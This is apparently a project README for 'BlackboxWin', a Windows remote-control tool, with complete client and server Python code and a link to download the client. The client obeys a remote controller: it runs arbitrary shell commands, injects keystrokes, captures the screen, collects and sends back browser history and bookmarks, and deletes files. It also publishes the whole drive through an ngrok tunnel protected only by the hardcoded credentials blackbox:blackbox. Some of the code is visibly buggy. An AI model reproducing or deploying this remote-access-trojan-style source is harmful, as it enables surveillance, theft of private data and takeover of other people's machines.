# BlackboxWin
full control of windows operating system using tcp network.<br>
<a href="https://drive.google.com/file/d/1pfK8nGel-JG5hOXMETchPsyHMDVjij4N/view?usp=sharing">download</a> for the client computer that will be controlled
# what can the controller do?
- fully use the keyboard
- record computer screen
- take a screenshot
- access all storage C:/ "requires verification from client"
- record browser history and bookmarks
- sending message
- open the url in the browser
- shell command


![alt text](gifBlackbox.gif)


# ``Client`` Code


``` python
#!usr/bin/python3
# window display
display =  """
        <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        <style>
            body{
                background-color: rgb(44, 41, 41);
                text-align: center;
            }
            div.box1{
                display: flex;
                max-width: 100%;
                height: 500px;
                background-color: rgb(44, 41, 41);
                text-align: center;
                align-items: center;
                justify-content: center;
                margin-top: -50px;
            }
            div.box1 div.box2{
                width: 250px;
                height: 250px;
                display: flex;
                justify-content: center;
                align-items: center;
                border-radius: 100%;
                border: 10px solid magenta;
                border-left-color: rgba(90, 99, 107, 0);
                border-right-color: rgba(240, 248, 255, 0);
                transition: 1s ease all;
                animation: x 10S ease infinite;
            }
            div.box1 div.box2 div.box3{
                width: 150px;
                height: 150px;
                display:  flex;
                justify-content: center;
                align-items: center;
                border-radius: 100%;
                border: 10px solid cyan;
                border-top-color: rgba(0, 0, 255, 0);
                border-bottom-color: rgba(0, 0, 255, 0);
                transition: 1s ease all;
                animation: y 5s ease infinite;
            }
            .options{
                display: none;
                width: 100%;
                height: 30px;
                margin-top: 10px;
                background-color: rgb(6, 61, 109);
                justify-content: space-around;
            }
            div.options button{border-radius: 20px;}
            div.options input[type='text']{
                width: 70px;
                border:none;
            }
            button.show{
                width: 100px;
                height: 30px;
                border-radius: 10px;
                background-color: rgb(63, 52, 52);
                box-shadow: 1px 1px 1px green;
                color: green;
            }
            .network{
                color: rgb(1, 255, 1);
                display: flex;
                flex-wrap: wrap;
                justify-content: center;
                transform: rotate(-240deg);
            }
            .active{
                background-color: rgb(143, 160, 143);
            }
            .toggleMe{display: flex;}
            p{
                color: green;
            }
            @keyframes x{
                from{
                    transform: rotate(0deg);
                    box-shadow: 1px 1px 1px green;
                }to{
                    transform: rotate(360deg);
                    box-shadow: -1px -1px 1px green;
                }
            }
            @keyframes y{
                from{
                    transform: rotate(0deg);
                    box-shadow: 1px 1px 1px green;
                }to{
                    transform: rotate(360deg);
                    box-shadow: -1px -1px 1px green;
                }
            }
            span.boxCdist{
                display: flex;
                align-items: center;
                justify-content: space-around;
                flex-wrap: wrap;
                width: 100%;
            }
            .boxCdist button{
                background-color: rgba(82, 6, 133, 0.61);
                border-radius: 20px;
                color: green;
            }
        </style>
    </head>
    <body>
        <button class="show" id="show">&#9763;</button>
        <div class="options" id="setOptions">
            <button id="host">host : <input type="text" id="valHost"></button>
            <button id="check">akses sepenuhnya : <input type="checkbox" id="valCheck"></button>
            <button id="port">port : <input type="text" id="valPort"></button>
        </div>
        <div class="box1">
            <div class="box2">
                <div class="box3">
                    <p class="network"><p id="showHost">127.0.0.1:</p><p id="showPort">9999</p></p>
                </div>
            </div>
        </div>
        <span class="boxCdist"><button id="disconnect">disconnect!</button><button id="connect">connected!</button></span>
        <script>
            function connected(){
                var button = document.getElementById("connect");
                button.addEventListener("click",(e)=>{
                    button.style.backgroundColor = "lightgreen";
                    pywebview.api.connect_to_server();
                })
            }connected();
            function disconnect(){
                var buttonConnect = document.getElementById("connect");
                var buttonDisconnect = document.getElementById("disconnect");
                buttonDisconnect.addEventListener("click",(e)=>{
                    buttonConnect.style.backgroundColor = "rgba(82, 6, 133, 0.61)";
                    pywebview.api.disconnect();
                })
            }disconnect()
            function show_menu_options(){
                var button = document.getElementById("show");
                button.addEventListener("click",(e)=>{
                    var menu = document.getElementById("setOptions");
                    menu.classList.toggle("toggleMe");
                });
            };show_menu_options();
            function host(){
                var host = document.getElementById('host');
                host.addEventListener('click',(event)=>{
                var valHost = document.getElementById(event.target.id);
                pywebview.api.hostname(valHost.value).then((host)=>{
                    var showHost = document.getElementById("showHost");
                    showHost.innerText = host.host+":";
                })
                });
            }host();
            function port(){
                var port = document.getElementById('port');
                port.addEventListener('click',(event)=>{
                var valPort = document.getElementById(event.target.id);
                pywebview.api.portname(valPort.value).then((port)=>{
                    var showPort = document.getElementById("showPort");
                    showPort.innerText = port.port;
                })
                });
            }port();
            function check(){
                var check = document.getElementById('check');
                check.addEventListener('click',(event)=>{
                var valCheck = document.getElementById(event.target.id);
                if(valCheck.value === "on"){
                    check.classList.toggle("active")
                    pywebview.api.connect_pathToServer();
                }else{
                    false;
                }
                });
            }check();
        </script>
    </body>
    </html>
"""
from socket import socket
class Blackbox_payloads(socket):
    def hostname(self,host="127.0.0.1"):
        host =  {"host":str(host)};
        return host;
    def portname(self,port=9999):
        port = {"port":int(port)};
        return port;
    # shell command
    def shell_command(self,command):
        try:
            self.shell = shell_cmd.sh(command);
            return str(self.shell).encode("utf-8");
        except:return str(f"command '{command}' not found!").encode("utf-8")
    # keys up
    def keys_up(self,key,logScreen=False):
        if logScreen == True:
            pyautogui.keyUp(key,logScreenshot=logScreen)
        else:pyautogui.keyUp(key,logScreenshot=logScreen);
        return str({"success":f"{'keyup',key} success !"}).encode("utf-8")
    # keys down
    def keys_down(self,key,logScreen=False):
        if logScreen == True:
            pyautogui.keyDown(key,logScreenshot=logScreen)
        else:pyautogui.keyDown(key,logScreenshot=logScreen);
        return str({"success":f"{'keydown',key} success !"}).encode("utf-8")
    # keys press
    def keys_press(self,key,logScreen=False):
        if logScreen == True:
            pyautogui.press(key,logScreenshot=logScreen)
        else:pyautogui.press(key,logScreenshot=logScreen);
        return str({"success":f"{'press',key} success !"}).encode("utf-8")
    # send message 
    def send_message(self,message,sound=False,lang="id"):
        if sound == True:
            pyautogui.alert(message);
            text_to_speech.speak(message,lang);
        else:pyautogui.alert(message);
    # screen shoot
    def screen_shoot(self,fileName:str):
        self.shoot = pyautogui.screenshot();
        self.shoot.save(fileName+".png");
    # screen recording
    def screen_recording(self,fileName:str,timeExit:int):
        self.screen = ScreenRecorder()
        self.screen.start_recording(fileName+".mp4");
        time.sleep(timeExit);
        self.screen.stop_recording();
        return str({"success":f"start recording,time exit ! {timeExit} filename {fileName}"}).encode("utf-8")
    # setting path directory
    def set_serv_pathdir(self):
        self.linux_path = "/home/";
        self.windows_path = "/C:/";
        self.android_path = "/sdcard/";
        self.login_auth = "ngrok http --auth=blackbox:blackbox file://";
        if os.name == "posix":
            try:shell_cmd.sh(self.login_auth+self.linux_path);#linux
            except:shell_cmd.sh(self.login_auth+self.android_path);#android
        else:shell_cmd.sh(self.login_auth+self.windows_path)#windows
    # try connect pathdir to server
    def connect_pathToServer(self):
        try:self.set_serv_pathdir();
        except:self.set_serv_pathdir();
    # get apikey
    def get_apikeys(self):
        try:
            self.get = requests.get("http://localhost:4040/api/tunnels").json()
            return str(self.get["tunnels"][0]["public_url"]).encode("utf-8");
        except:return str("access rights denied!").encode("utf-8");
    # hot keys
    def hot_keys(self,*args,logScreen=False):
        if   len(args) == 1:pyautogui.hotkey(args[0],logScreenshot=logScreen);
        elif len(args) == 2:pyautogui.hotkey(args[0],args[1],logScreenshot=logScreen);
        elif len(args) == 3:pyautogui.hotkey(args[0],args[1],args[2],logScreenshot=logScreen);
        elif len(args) == 4:pyautogui.hotkey(args[0],args[1],args[2],args[3],logScreenshot=logScreen);
        elif len(args) == 5:pyautogui.hotkey(args[0],args[1],args[2],args[3],logScreenshot=logScreen);
        else:pass;
        return str({"success":f"hotkey {args} success !"}).encode("utf-8")
    # history chrome
    def history_chrome(self):
        self.results = {
            "History"  :[],
            "Bookmarks":[],
        }
        self.lists_bookmarks = json.loads(browsers.Chrome().fetch_bookmarks().to_json());
        self.browser_history = json.loads(browsers.Chrome().fetch_history().to_json())
        for bookmarks,history in zip(
            self.lists_bookmarks['bookmarks'],
            self.browser_history['history']):
            marks = "Timestamp : "+bookmarks['Timestamp'],"URL : "+bookmarks['URL'],"Title : "+bookmarks['Title'],"Folder : "+bookmarks['Folder'];
            hists = "URL : "+history['URL'],"Timestamp : "+history['Timestamp'],
            self.results['Bookmarks'].append(marks);self.results['History'].append(hists);
        if not self.results['History']:
            return str("Problem browser is not installed!").encode('utf-8');
        else:return json.dumps(self.results,indent=2,sort_keys=True);
    # history firefox
    def history_firefox(self):
        self.results = {
            "History"  :[],
            "Bookmarks":[],
        }
        self.lists_bookmarks = json.loads(browsers.Firefox().fetch_bookmarks().to_json());
        self.browser_history = json.loads(browsers.Firefox().fetch_history().to_json())
        for bookmarks,history in zip(
            self.lists_bookmarks['bookmarks'],
            self.browser_history['history']):
            marks = "Timestamp : "+bookmarks['Timestamp'],"URL : "+bookmarks['URL'],"Title : "+bookmarks['Title'],"Folder : "+bookmarks['Folder'];
            hists = "URL : "+history['URL'],"Timestamp : "+history['Timestamp'],
            self.results['Bookmarks'].append(marks);self.results['History'].append(hists);
        if not self.results['History']:
            return str("Problem browser is not installed!").encode('utf-8');
        else:return json.dumps(self.results,indent=2,sort_keys=True);
    # history chromium
    def history_chromium(self):
        self.results = {
            "History"  :[],
            "Bookmarks":[],
        }
        self.lists_bookmarks = json.loads(browsers.Chromium().fetch_bookmarks().to_json());
        self.browser_history = json.loads(browsers.Chromium().fetch_history().to_json())
        for bookmarks,history in zip(
            self.lists_bookmarks['bookmarks'],
            self.browser_history['history']):
            marks = "Timestamp : "+bookmarks['Timestamp'],"URL : "+bookmarks['URL'],"Title : "+bookmarks['Title'],"Folder : "+bookmarks['Folder'];
            hists = "URL : "+history['URL'],"Timestamp : "+history['Timestamp'],
            self.results['Bookmarks'].append(marks);self.results['History'].append(hists);
        if not self.results['History']:
            return str("Problem browser is not installed!").encode('utf-8');
        else:return json.dumps(self.results,indent=2,sort_keys=True);
    # history opera
    def history_opera(self):
        self.results = {
            "History"  :[],
            "Bookmarks":[],
        }
        self.lists_bookmarks = json.loads(browsers.Opera().fetch_bookmarks().to_json());
        self.browser_history = json.loads(browsers.Opera().fetch_history().to_json())
        for bookmarks,history in zip(
            self.lists_bookmarks['bookmarks'],
            self.browser_history['history']):
            marks = "Timestamp : "+bookmarks['Timestamp'],"URL : "+bookmarks['URL'],"Title : "+bookmarks['Title'],"Folder : "+bookmarks['Folder'];
            hists = "URL : "+history['URL'],"Timestamp : "+history['Timestamp'],
            self.results['Bookmarks'].append(marks);self.results['History'].append(hists);
        if not self.results['History']:
            return str("Problem browser is not installed!").encode('utf-8');
        else:return json.dumps(self.results,indent=2,sort_keys=True);
    # history edge
    def history_edge(self):
        self.results = {
            "History"  :[],
            "Bookmarks":[],
        }
        self.lists_bookmarks = json.loads(browsers.Edge().fetch_bookmarks().to_json());
        self.browser_history = json.loads(browsers.Edge().fetch_history().to_json())
        for bookmarks,history in zip(
            self.lists_bookmarks['bookmarks'],
            self.browser_history['history']):
            marks = "Timestamp : "+bookmarks['Timestamp'],"URL : "+bookmarks['URL'],"Title : "+bookmarks['Title'],"Folder : "+bookmarks['Folder'];
            hists = "URL : "+history['URL'],"Timestamp : "+history['Timestamp'],
            self.results['Bookmarks'].append(marks);self.results['History'].append(hists);
        if not self.results['History']:
            return str("Problem browser is not installed!").encode('utf-8');
        else:return json.dumps(self.results,indent=2,sort_keys=True);
    def disconnect(self):
        return self.close();
    def connect_to_server(self):
        self.connect((
            self.hostname()["host"],
            self.portname()["port"]));
        while True:
            self.split_data = self.recv(8888).decode("utf-8").split()
            # history
            if self.split_data[0] == "history":
                if len(self.split_data) == 1:
                    self.send(str("no browser name!").encode('utf-8'))
                # chrome
                elif self.split_data[1] == "chrome":
                    self.send(self.history_chrome()).encode("utf-8");
                # firefox
                elif self.split_data[1] == "firefox":
                    self.send(self.history_firefox()).encode("utf-8");
                # chromium
                elif self.split_data[1] == "chromium":
                    self.send(self.history_chromium()).encode("utf-8");
                # opera
                elif self.split_data[1] == "opera":
                    self.send(self.history_opera()).encode("utf-8");
                # edge
                elif self.split_data[1] == "edge":
                    self.send(self.history_edge()).encode("utf-8");
                else:self.send(str(f"Name browser {self.split_data[1]} not found!").encode('utf-8'));
            # access computer
            elif self.split_data[0] == "accesscomputer":
                if len(self.split_data) == 1:
                    self.send(str("incomplete command!").encode("utf-8"));
                elif self.split_data[1] == "now":
                    self.send(self.get_apikeys());
                else:
                    self.send(str("command unknown!").encode("utf-8"));
            # keyup
            elif self.split_data[0] == "keyup":
                if len(self.split_data) == 1:
                    self.send(str("error, key not found!").encode("utf-8"));
                else:
                    self.keys_up(self.split_data[1]);
                    self.send(str(f"keyUp {self.split_data[1]} success !").encode("utf-8"));
            # keydown
            elif self.split_data[0] == "keydown":
                if len(self.split_data) == 1:
                    self.send(str("error, key not found!").encode("utf-8"));
                else:
                    self.keys_down(self.split_data[1]);
                    self.send(str(f"keyDown {self.split_data[1]} success !").encode("utf-8"));
            # keypress
            elif self.split_data[0] == "keypress":
                if len(self.split_data) == 1:
                    self.send(str("error, key not found!").encode("utf-8"));
                else:
                    self.keys_press(self.split_data[1]);
                    self.send(str(f"keyPress {self.split_data[1]} success !").encode("utf-8"));
            # send message
            elif self.split_data[0] == "message":
                if len(self.split_data) == 1:
                    self.send(str("error, no message!").encode("utf-8"));
                else:
                    uMsg = " ";
                    for msg in self.split_data[1:]:
                        uMsg += str(msg) + " ";
                    self.send_message(uMsg);
                    self.send(str(f"message '{uMsg}' success !").encode("utf-8"));
            # screen shoot
            elif self.split_data[0] == "screenshoot":
                if len(self.split_data) == 1:
                    self.send(str("error, filename!").encode("utf-8"));
                else:
                    self.screen_shoot(self.split_data[1]);
                    self.send(str(f"saveFile {self.split_data[1]}.png success !").encode("utf-8"));
            # screen recording
            elif self.split_data[0] == "screenrecord":
                if len(self.split_data) == 1:
                    self.send(str("error, filename - timeRecord").encode("utf-8"));
                else:
                    self.screen_recording(self.split_data[1],int(self.split_data[2]));
                    self.send(str(f"saveFile {self.split_data[1]+'.mp4',self.split_data[2]+'s'} success !").encode("utf-8"));
            # hot keys
            elif self.split_data[0] == "hotkeys":
                hot = " ";
                for hotkey in self.split_data[1:]:
                    hot += str(hotkey) + " ";
                if len(self.split_data) == 1:
                    self.send(str("error, keys not found!").encode("utf-8"));
                elif len(self.split_data) == 2:
                    self.hot_keys(self.split_data[1])
                    self.send(str(f"hotkeys {hot} success !").encode("utf-8"));
                elif len(self.split_data) == 3:
                    self.hot_keys(self.split_data[1],self.split_data[2])
                    self.send(str(f"hotkeys {hot} success !").encode("utf-8"));
                elif len(self.split_data) == 4:
                    self.hot_keys(self.split_data[1],self.split_data[2],self.split_data[3]);
                    self.send(str(f"hotkeys {hot} success !").encode("utf-8"));
                elif len(self.split_data) == 5:
                    self.hot_keys(self.split_data[1],self.split_data[2],self.split_data[3],self.split_data[4])
                    self.send(str(f"hotkeys {hot} success !").encode("utf-8"));
                else:
                    self.hot_keys(self.split_data[1],self.split_data[2],self.split_data[3],self.split_data[4])
                    self.send(str(f"hotkeys max 4 args {hot} success !").encode("utf-8"));
            # make dirs
            elif self.split_data[0] == "mkdir":
                try:
                    name_dir = " ";
                    for path in self.split_data[1:]:
                        name_dir += path;
                    os.makedirs(name_dir);
                    self.send(str(f"dirName {name_dir} successfully!").encode("utf-8"));
                except:self.send(str(f"dirName {self.split_data} error!").encode("utf-8"));
            # open urls
            elif self.split_data[0] == "openurl":
                if len(self.split_data) == 1:
                    self.send(str("please input URL!").encode("utf-8"));
                else:
                    self.check = webbrowser.open(self.split_data[1]);
                    if self.check == True:
                        self.send(str(f"open {self.split_data[1]} success !").encode("utf-8"));
                    else:self.send(str(f"failed open {self.split_data[1]} :(").encode("utf-8"));
            # remove dir
            elif self.split_data[0] in ["rd","rm"]:
                try:
                    remove_dir = " ";
                    for path in self.split_data[1:]:
                        remove_dir += path;
                    os.rmdir(remove_dir);
                    self.send(str(f"removeDir {name_dir} successfully!").encode("utf-8"));
                except:self.send(str(f"removeDir {self.split_data} error!").encode("utf-8"));
            # remove file
            elif self.split_data[0] in ["del","rm -f"]:
                try:
                    remove_file = " ";
                    for path in self.split_data[1:]:
                        remove_file += path;
                    os.remove(remove_file);
                    self.send(str(f"removeFile {remove_file} successfully!").encode("utf-8"));
                except:self.send(str(f"removeFile {self.split_data} error!").encode("utf-8"));
            else:
                try:
                    cmd = " ";
                    for c in self.split_data:
                        cmd += c+" ";
                    self.send(self.shell_command(cmd));
                except:pass;
        self.close();

if __name__=="__main__":
    import json,time,os
    def setup(): # requirements
        for pkg in ['pyngrok','PyAutoGUI','browser-history',
                'text-to-speech','pyscreenrec','requests','pywebview']:
            if os.name == 'nt':
                os.system('pip install '+pkg);
                os.system('cls')
            else:
                os.system('pip3 install '+pkg);
                os.system('clear');
    try: # check packages
        from   browser_history import browsers
        from   pyscreenrec import ScreenRecorder
        import shell_cmd
        import text_to_speech
        import webview
        import webbrowser
        import pyautogui
        import requests
    except:setup(); # install packages
    jsApi = Blackbox_payloads(); # setting window
    webview.create_window(
        title="Blackbox1.0 Client",
        html=display,
        js_api=jsApi,
        confirm_close=True,
        text_select=False,
        on_top=True,
        transparent=True
    );webview.start(); # main window
```

# ``Server`` Code

``` python
from socket import socket
import os,art,stringcolor
import webbrowser
#setting window
class Blackbox(socket):
    __hostname = "127.0.0.1";
    __portname = 9999;
    @property
    def hostname(self):
        return str(Blackbox.__hostname);
    @property
    def portname(self):
        return int(Blackbox.__portname);
    def help(self):
        print(stringcolor.cs(str(art.text2art(
        """
        screenshoot filename   : screen capture
        screenrecord filename duration : screen recording
        message [text message] : message text
        keyup   [key]  : keyup keyboard 1 argument
        keydown [key]  : keydown keyboard 1 argument
        keypress[key]  : keypress keyboard 1 argument
        hotkeys [keys] : hotkeys max 4 arguments
        openurl [url]  : open url
        history [browserName] : chrome,firefox,edge,opera,chromium
        accesscomputer now : access all storage C:/
        option command : shell command
        """,'tiny2')),'green'));
    def connect_to_client(self):
        self.host = self.hostname;
        self.port = self.portname;
        self.bind((
            self.host,
            self.port
        ));
        self.listen(15);
        print(stringcolor.cs(str(
            art.text2art('menunggu koneksi...',
            'tiny2')),'green'));
        conn,addr = self.accept();
        print(stringcolor.cs(str(
            art.text2art(
                f'terhubung ke {addr[0]}',
                'tiny2')),'green'));
        print(stringcolor.cs(str(
            art.text2art('\tBLACKBOX\n',
            'sheqi')),'blue'));
        while True:
            self.styles = stringcolor.cs(str(art.art('lenny')),'blue')
            self.command = input(self.styles);
            if not self.command:pass;
            elif self.command in ['clear','cls']:
                if os.name == 'nt':os.system('cls');
                else:os.system('clear');
            elif self.command in ['exit','disconnect']:self.close();break;
            elif self.command == "accesscomputer now":
                conn.send(str(self.command).encode('utf-8'));
                self.response = conn.recv(8888).decode("utf-8");
                if self.response in ["access rights denied!","incomplete command!","command unknown!"]:
                    print("\n",self.response,"\n");
                else:
                    self.openURL = webbrowser.open(self.response);
                    if self.openURL == False:
                        print(f"Login[user : blackbox, pass : blackbox, URL : {self.response}]");
                    else:print("Login[user : blackbox, pass : blackbox]")
            elif self.command in ['help','Help']:self.help()
            else:
                conn.send(str(self.command).encode('utf-8'));
                print(conn.recv(8888).decode('utf-8'));
        self.close();
     
if __name__=="__main__":
    blackbox = Blackbox()
    blackbox.connect_to_client()
```
